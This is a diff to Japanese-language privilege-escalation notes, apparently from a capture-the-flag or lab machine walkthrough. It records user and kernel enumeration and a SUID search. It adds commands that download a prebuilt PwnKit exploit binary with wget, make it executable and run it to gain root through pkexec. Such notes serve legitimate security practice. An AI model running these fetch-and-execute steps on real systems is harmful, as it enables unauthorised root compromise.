@@ -34,6 +34,9 @@
 - 他のユーザを探す
   - `cd /home`3人いる、探索する
   - ahmed,unicortの中を見ても同じバイト数でしかも見れない。特に何もなさそう 
+- `uname -a`
+  - Linux5.11.0 64bit
+  - nmapが4.15~5.8だったので全然違う 
 - サイトの構造を調べる
   - `cd /var/www/html/`
   -  自作のサイトらしい
@@ -42,7 +45,14 @@
   - pspyで見たほうがいいかも 
 - SUIDを探す
   - pkexec以外なし 
-- pwnkit
+- pwnkitを調べる
+  - `pkexec --version`
+  - `gcc` 
+- pwnkitを実行する 
+  - gccが入っていないので、バイナリをダウンロードする
+  - `wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit`
+  - `chmod +x PwnKit`
+  - `./PwnKit` 
 
 ## proftpの説明
 - /etc/vsftpd.conf
